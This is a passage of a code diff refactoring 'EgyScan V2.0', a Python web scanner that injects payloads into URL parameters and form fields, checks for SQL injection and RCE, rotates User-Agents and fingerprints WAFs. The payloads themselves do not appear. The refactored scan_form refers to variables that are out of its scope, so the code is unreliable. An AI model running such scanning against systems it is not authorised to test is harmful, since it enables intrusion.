-                    logging.warning(f"Invalid URL: {current_url}")
 
         workers = []
         for _ in range(num_threads):
@@ -1709,11 +1346,11 @@ def collect_urls(target_url, num_threads=10, session=None):
         for _ in range(num_threads):
             task_queue.put(None)
 
-        for worker in workers:
-            worker.join()
+        for worker_thread in workers:
+            worker_thread.join()
 
     return processed_urls
-   
+ 
 detected_wafs = []
 
 common_wafs = {
@@ -1758,21 +1395,57 @@ common_wafs = {
     "vidado": ["vidado"],
 }
 
+def print_warning(message):
+    print(f"\033[93m{message}\033[0m")
+
+
+def make_request(url, data=None, method="GET", headers=None, retries=3, backoff_factor=0.3, timeout=10):
+    user_agent = random.choice(USER_AGENTS)
+    request_headers = {
+        "User-Agent": user_agent
+    }
+    if headers:
+        request_headers.update(headers)
+
+    session = requests.Session()
+
+    retry_strategy = Retry(
+        total=retries,
+        backoff_factor=backoff_factor,
+        allowed_methods=frozenset(["GET", "POST"]),
+        status_forcelist=[500, 502, 503, 504, 404],
+    )
+    adapter = HTTPAdapter(max_retries=retry_strategy)
+    session.mount("http://", adapter)
+    session.mount("https://", adapter)
+
+    try:
+        with session.request(method=method, url=url, data=data, headers=request_headers, timeout=timeout) as response:
+            response.raise_for_status()  
+            return response
+    except RequestException as e:
+        print(f"Error occurred while making the request: {e}")
+        return None
+
+
+def scan_form(form):
+    form_action = form.get("action")
+    if form_action:
+        if not form_action.startswith("http"):
+            form_action = urljoin(base_url, form_action)
+        form_inputs = form.find_all(["input", "textarea"])
+        form_data = {input_field.get("name"): input_field.get("value") for input_field in form_inputs}
+
+        if tokens:
+            form_data.update(tokens)
+
+        inject_payloads(form_action, form_data, payloads, vulnerable_urls, headers=headers)
+
 def scan_and_inject_payloads(url, payloads, headers=None, tokens=None, threads=10):
     parsed_url = urlparse(url)
     params = parse_qs(parsed_url.query)
     vulnerable_urls = set()
     detected_wafs = []
-
-    def make_request(url, data=None, method="GET", headers=None):
-        user_agent = random.choice(USER_AGENTS)
-        request_headers = {
-            "User-Agent": user_agent
-        }
-        if headers:
-            request_headers.update(headers)
-        with requests.request(method=method, url=url, data=data, headers=request_headers) as response:
-            return response
 
     def inject_payloads(url, params, payloads, vulnerable_urls, headers=None):
         base_url = urlparse(url).scheme + "://" + urlparse(url).netloc
@@ -1786,60 +1459,62 @@ def scan_and_inject_payloads(url, payloads, headers=None, tokens=None, threads=1
                         f"{key}={quote(value[0])}" for key, value in injected_params.items()
                     )
                     response = make_request(injected_url, headers=headers)
-                    scan_response(response, vulnerable_urls)
-
-    def scan_response(response, vulnerable_urls):
-        for check_func, vulnerability_type in vulnerability_checks.items():
-            if check_func(response.url):
-                print_warning(f"{vulnerability_type}{response.url}")
-                vulnerable_urls.add(response.url)
-
-        for waf_name, waf_signatures in common_wafs.items():
-            for signature in waf_signatures:
-                if signature.lower() in response.headers.get("Server", "").lower():
-                    detected_wafs.append(waf_name)
-
-        print("Response:EgyScan Version 2.0")
-        print(f"Status Code: {response.status_code}")
-        print(f"Server: {response.headers.get('Server', 'N/A')}")
-        print(f"Server Version: {response.headers.get('X-Powered-By', 'N/A')}")
-        print("--------------")
-
-    def scan_form(form):
-        form_action = form.get("action")
-        if form_action:
-            if not form_action.startswith("http"):
-                form_action = urljoin(base_url, form_action)
-            form_inputs = form.find_all(["input", "textarea"])
-            form_data = {input_field.get("name"): input_field.get("value") for input_field in form_inputs}
-
-            if tokens:
-                form_data.update(tokens)
-
-            inject_payloads(form_action, form_data, payloads, vulnerable_urls, headers=headers)
+                    if response is not None:
+                        scan_response(response, vulnerable_urls)
 
     inject_payloads(url, params, payloads, vulnerable_urls, headers=headers)
 
     response = make_request(url, headers=headers)
-    scan_response(response, vulnerable_urls)
+    if response is not None:
+        if response.status_code == 403:
+            print(f"Access Forbidden: The server responded with a 403 error for {url}")
+            return vulnerable_urls
+
+        scan_response(response, vulnerable_urls)
 
     soup = BeautifulSoup(response.text, "html.parser")
     forms = soup.find_all("form")
 
     form_chunks = [forms[i:i + threads] for i in range(0, len(forms), threads)]
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
-        executor.map(scan_form, forms)
-
+    try:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+            for form_chunk in tqdm(form_chunks, desc="Scanning forms", unit=" forms", leave=False):
+                executor.map(scan_form, form_chunk)
+    except KeyboardInterrupt:
+        print_warning("\nScan interrupted by user (Ctrl+C). Exiting gracefully...")
+        executor.shutdown(wait=False)
+        
     if detected_wafs:
         print("Detected WAFs:")
         for waf in detected_wafs:
             print(f"- {waf}")
 
     return vulnerable_urls
+    
+def scan_response(response, vulnerable_urls):
+    url = response.url
 
+    try:
+        response.raise_for_status()
+    except requests.exceptions.HTTPError as e:
+        print_warning(f"HTTP Error {e.response.status_code}: {url}\n")
+        return
 
+    def check_vulnerability(check_func, vulnerability_type):
+        try:
+            if check_func(url):
+                print_warning(f"{vulnerability_type}{url}\n")
+                vulnerable_urls.add(url)
+        except Exception as e:
+            print_warning(f"Error occurred while checking vulnerability: {e}\n")
 
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        futures = [executor.submit(check_vulnerability, check_func, vulnerability_type) for check_func, vulnerability_type in vulnerability_checks.items()]
+
+    for future in concurrent.futures.as_completed(futures):
+        future.result()
+    
 vulnerability_checks = {
     check_sqli: "SQL Injection\n",
     check_rce: "Remote Code Execution\n",
@@ -1945,6 +1620,9 @@ def get_target_url():
             continue
 
         return user_input
+
+VULNERABLE_URLS_FILE = 'vulnerable_urls.txt'
+
 def main():
     print_logo()
     print("EgyScan V2.0\nhttps://github.com/dragonked2/Egyscan")
